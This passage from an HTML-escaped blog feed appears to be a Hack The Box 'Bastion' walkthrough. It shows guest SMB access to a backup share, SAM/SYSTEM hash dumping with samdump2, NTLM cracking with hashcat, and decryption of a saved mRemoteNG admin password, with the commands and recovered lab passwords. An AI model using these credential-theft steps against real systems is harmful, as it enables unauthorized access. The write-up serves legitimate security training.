&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Guest SMB session established on 10.10.10.134...
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; IP: 10.10.10.134:445        Name: 10.10.10.134
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS
        IPC$                                                    READ ONLY
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After running smbmap, I discover a share called Backups that I have read and write permissions as a guest user.&lt;/p&gt;
&lt;p&gt;Since this is a windows machine I will switch to my windows vm to make my work easier.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/backup_share.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;Contents of note.txt&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Sysadmins: please don&amp;rsquo;t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Going deeper into the WindowsImageBackup folder I found a backup image which is quite big. Downloading the whole file would not be an option as the note.txt suggested. Fortunately I can mount it through the share remotely, this is the reason why I wanted to use a windows vm.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/backup_share_2.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;On mounting it, it appears as Local Disk (D:). After accessing the home directory of user L4mpje and looking through the folders there was no user.txt, it must have been excluded from the backup.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/backup_share_3.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;At this stage I was stuck for a while (I still suck at owning windows) and after some hints in the forum I figured I should look at where credentials are stored locally on windows and how to get them. Simply the equivalent of /etc/shadow or /etc/passwd on linux.&lt;/p&gt;
&lt;p&gt;I learnt that I should be looking in C:\windows\system32\config for the SAM and SYSTEM files which I found.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/backup_share_4.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h5 id=&#34;now-to-get-the-credentials&#34;&gt;Now to get the credentials!&lt;/h5&gt;
&lt;p&gt;I pulled the 2 files back to my kali box and using samdump2 I got the user hash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;samdump2 SYSTEM SAM

*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I then cracked the NTLM hash for L4mpje using hashcat and got the password.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt; -a &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt --force

26112010952d963c8dc4217daec986d9:bureaulampje
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h1&gt;
&lt;p&gt;Now that I have a username and password I can login through ssh.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/bastion_5.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Now that user is owned, let&amp;rsquo;s try to escalate privileges to admin.&lt;/p&gt;
&lt;p&gt;I switched to powershell and started looking at installed programs. mRemoteNG isn&amp;rsquo;t a default windows application so let me look into it and if it can help in privesc.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/bastion_6.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;According to their website:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;mRemoteNG is a fork of mRemote: an open source, tabbed, multi-protocol, remote connections manager.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I found a metasploit module that claims to extract saved passwords from mRemoteNG. Since I am logged in I don&amp;rsquo;t need metasploit so I looked at the source to see how it extracts the passwords and decrypts them.&lt;/p&gt;
&lt;p&gt;The saved passwords are located in AppData in mRemoteNG\confCons.xml. Once I found the file the admin password was there but encrypted.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/bastion_7.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I was able to find a script on github to decrypt the password.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;

Password: thXLHM96BeKL0ER2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I can finally login as administrator and own system!&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/bastion_8.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;references&#34;&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;mremoteng_decrypt.py&lt;/a&gt;

&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://vulners.com/metasploit/MSF:POST/WINDOWS/GATHER/CREDENTIALS/MREMOTE/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;mremote metasploit module&lt;/a&gt;

&lt;/li&gt;
&lt;/ul&gt;</content>
    </item>
    
  </channel>
</rss>
